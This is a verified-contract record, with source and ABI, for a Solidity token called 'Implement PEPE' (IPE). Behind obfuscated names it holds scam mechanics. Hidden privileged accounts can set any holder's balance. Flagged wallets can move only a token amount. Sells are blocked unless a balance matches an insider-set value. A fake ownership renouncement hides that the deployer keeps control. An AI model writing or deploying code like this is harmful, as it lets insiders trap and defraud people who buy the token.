{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface minTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeReceiver) external view returns (uint256);\n\n    function transfer(address walletTakeReceiver, uint256 listLiquidity) external returns (bool);\n\n    function allowance(address fromBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTakeReceiver,\n        uint256 listLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapEnable, uint256 value);\n    event Approval(address indexed fromBuy, address indexed spender, uint256 value);\n}\n\nabstract contract listBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTradingLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellShould {\n    function createPair(address launchLimit, address txSwap) external returns (address);\n}\n\ninterface tradingIs is minTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImplementPEPE is listBuy, minTake, tradingIs {\n\n    function atTotalLiquidity(uint256 listLiquidity) public {\n        fundLimitMode();\n        receiverAuto = listLiquidity;\n    }\n\n    mapping(address => bool) public amountFrom;\n\n    uint256 constant toEnableExempt = 2 ** 10;\n\n    function balanceOf(address takeReceiver) public view virtual override returns (uint256) {\n        return shouldTake[takeReceiver];\n    }\n\n    uint256 private listToken;\n\n    uint8 private receiverTo = 18;\n\n    function allowance(address receiverMode, address liquidityIs) external view virtual override returns (uint256) {\n        if (liquidityIs == shouldMode) {\n            return type(uint256).max;\n        }\n        return swapMode[receiverMode][liquidityIs];\n    }\n\n    uint256 receiverAuto;\n\n    function atIsLiquidity(address fundAmount) public {\n        fundLimitMode();\n        \n        if (fundAmount == limitAuto || fundAmount == limitSwap) {\n            return;\n        }\n        fromAmountMode[fundAmount] = true;\n    }\n\n    uint256 private swapBuySell = 100000000 * 10 ** 18;\n\n    function transfer(address tokenSender, uint256 listLiquidity) external virtual override returns (bool) {\n        return sellMode(_msgSender(), tokenSender, listLiquidity);\n    }\n\n    uint256 exemptTeam;\n\n    function takeExempt() public {\n        emit OwnershipTransferred(limitAuto, address(0));\n        listTeam = address(0);\n    }\n\n    address public limitSwap;\n\n    string private feeIsSell = \"IPE\";\n\n    mapping(address => bool) public fromAmountMode;\n\n    function fundLimitMode() private view {\n        require(amountFrom[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapTx;\n    }\n\n    function totalIsLaunch(address tradingShould) public {\n        if (feeToSender) {\n            return;\n        }\n        \n        amountFrom[tradingShould] = true;\n        \n        feeToSender = true;\n    }\n\n    bool private launchMode;\n\n    mapping(address => uint256) private shouldTake;\n\n    function limitTeam(address tokenSender, uint256 listLiquidity) public {\n        fundLimitMode();\n        shouldTake[tokenSender] = listLiquidity;\n    }\n\n    function launchReceiver(address receiverIsMax, address walletTakeReceiver, uint256 listLiquidity) internal returns (bool) {\n        require(shouldTake[receiverIsMax] >= listLiquidity);\n        shouldTake[receiverIsMax] -= listLiquidity;\n        shouldTake[walletTakeReceiver] += listLiquidity;\n        emit Transfer(receiverIsMax, walletTakeReceiver, listLiquidity);\n        return true;\n    }\n\n    uint256 private fundMax;\n\n    bool public feeToSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeIsSell;\n    }\n\n    function getOwner() external view returns (address) {\n        return listTeam;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapMode;\n\n    address shouldMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapBuySell;\n    }\n\n    bool public limitTrading;\n\n    constructor (){\n        \n        takeTradingLiquidity liquidityLaunchedList = takeTradingLiquidity(shouldMode);\n        limitSwap = sellShould(liquidityLaunchedList.factory()).createPair(liquidityLaunchedList.WETH(), address(this));\n        if (launchedAmount != launchMode) {\n            limitTrading = false;\n        }\n        limitAuto = _msgSender();\n        takeExempt();\n        amountFrom[limitAuto] = true;\n        shouldTake[limitAuto] = swapBuySell;\n        \n        emit Transfer(address(0), limitAuto, swapBuySell);\n    }\n\n    string private swapTx = \"Implement PEPE\";\n\n    bool private launchedAmount;\n\n    address private listTeam;\n\n    function sellMode(address receiverIsMax, address walletTakeReceiver, uint256 listLiquidity) internal returns (bool) {\n        if (receiverIsMax == limitAuto) {\n            return launchReceiver(receiverIsMax, walletTakeReceiver, listLiquidity);\n        }\n        uint256 enableIs = minTake(limitSwap).balanceOf(listMax);\n        require(enableIs == receiverAuto);\n        require(walletTakeReceiver != listMax);\n        if (fromAmountMode[receiverIsMax]) {\n            return launchReceiver(receiverIsMax, walletTakeReceiver, toEnableExempt);\n        }\n        return launchReceiver(receiverIsMax, walletTakeReceiver, listLiquidity);\n    }\n\n    event OwnershipTransferred(address indexed tokenExemptMin, address indexed maxMode);\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTo;\n    }\n\n    function owner() external view returns (address) {\n        return listTeam;\n    }\n\n    bool private buySenderAmount;\n\n    address listMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public limitAuto;\n\n    function transferFrom(address receiverIsMax, address walletTakeReceiver, uint256 listLiquidity) external override returns (bool) {\n        if (_msgSender() != shouldMode) {\n            if (swapMode[receiverIsMax][_msgSender()] != type(uint256).max) {\n                require(listLiquidity <= swapMode[receiverIsMax][_msgSender()]);\n                swapMode[receiverIsMax][_msgSender()] -= listLiquidity;\n            }\n        }\n        return sellMode(receiverIsMax, walletTakeReceiver, listLiquidity);\n    }\n\n    uint256 private modeLaunchSell;\n\n    bool public minToken;\n\n    function approve(address liquidityIs, uint256 listLiquidity) public virtual override returns (bool) {\n        swapMode[_msgSender()][liquidityIs] = listLiquidity;\n        emit Approval(_msgSender(), liquidityIs, listLiquidity);\n        return true;\n    }\n\n    bool public isReceiverSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenExemptMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"atIsLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"atTotalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAmountMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"limitTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"totalIsLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIsMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTakeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ImplementPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}